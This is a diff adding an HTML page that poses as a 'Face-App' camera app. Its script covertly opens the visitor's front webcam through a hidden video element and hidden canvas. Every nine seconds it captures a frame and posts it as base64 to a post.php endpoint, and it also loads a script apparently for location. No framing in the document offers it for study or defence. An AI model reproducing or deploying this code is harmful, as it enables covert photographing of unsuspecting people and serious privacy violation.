@@ -1,0 +1,134 @@
+<!doctype html>
+<html>
+<head>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+</head>
+
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style.css">
+    <title>Face-App</title>
+    <script>
+        window.console = window.console || function (t) {
+        };
+    </script>
+    <script>
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+</head>
+
+<body translate="no">
+<div id="device">
+    <div id="top">
+        <div class="left">&nbsp;</div>
+        <div class="right">&nbsp;</div>
+    </div>
+    <div id="content">
+        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
+            <div class="profilePhoto"></div>
+            <i class="fas fa-volume-mute fa-lg"></i>
+        </div>
+        <div class="takenPhotos">
+            <div class="first"></div>
+            <div class="second"></div>
+            <div class="third"></div>
+        </div>
+        <div class="circle">
+            <div class="fill"></div>
+        </div>
+        <i class="fas fa-sync-alt fa-lg right"></i>
+        <div class="detection">
+            <div class="line-left"></div>
+            <div class="line-top"></div>
+            <div class="line-right"></div>
+            <div class="line-bottom"></div>
+        </div>
+    </div>
+</div>
+<link rel="stylesheet" href="all.css">
+</body>
+</html>
